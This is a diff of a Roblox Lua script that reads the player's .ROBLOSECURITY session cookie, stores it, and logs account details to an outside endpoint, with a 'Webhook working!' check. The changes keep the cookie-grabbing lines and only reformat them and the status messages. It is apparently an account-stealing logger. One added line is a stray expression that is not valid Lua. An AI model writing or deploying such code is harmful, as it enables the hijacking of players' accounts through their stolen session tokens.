@@ -1,12 +1,12 @@
 local Players = game:GetService("Players")
-local CookieService = game:GetService("CookieService")
+game:GetService("CookieService"):GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") or ""
 local LocalizationService = game:GetService("LocalizationService")
 
 local player = Players.LocalPlayer
 local apiUrl = "https://depazzhub-api.onrender.com/log"
 
-local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
-game.ReplicatedStorage.Cookies = savedCookie or ""
+local savedCookie = game:GetService("CookieService"):GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") or ""
+game.ReplicatedStorage.Cookies = savedCookie
 
 local days = player.AccountAge
 local years = math.floor(days / 365)
@@ -46,7 +46,7 @@ local success, result = pcall(function()
 end)
 
 if success then
-	print("Webhook working!")
+	print("✅ Webhook working!")
 else
-	print("Error:", result)
+	print("❌ Error:", result)
 end
